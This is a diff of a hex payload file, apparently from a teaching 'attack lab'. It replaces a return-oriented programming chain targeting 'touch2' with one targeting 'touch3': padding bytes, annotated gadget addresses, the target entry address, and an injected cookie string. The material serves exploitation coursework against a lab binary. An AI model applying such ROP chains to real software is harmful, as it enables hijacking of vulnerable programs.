@@ -1,14 +1,26 @@
 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40
 /* 40 dummy bytes */
 
-ab 19 40 00 00 00 00 00
-/* gadget 1: popq %rax */
-
-e4 54 60 00 00 00 00 00
-/* my cookie */
+06 1a 40 00 00 00 00 00
+/* gadget 1: movq %rsp,%rax */
 
 c5 19 40 00 00 00 00 00 
-/* gadget 2: movq %rax, %rdi */
+/* gadget 2: movq %rax,%rdi */
+
+d6 19 40 00 00 00 00 00
+/* gadget 3: lea ($rdi,%rsi,1),%rax */
+
+c5 19 40 00 00 00 00 00 
+/* gadget 4: movq %rax,%rdi */
+
+e6 19 40 00 00 00 00 00
+/* gadget 5: nop */
 
 fa 18 40 00 00 00 00 00
-/* touch2 entry */
+/* touch3 entry */
+
+08 08 08 08 08 08 08 08
+/* 8 dummy bytes */
+
+35 39 62 39 39 37 66 61 00
+/* injected string */
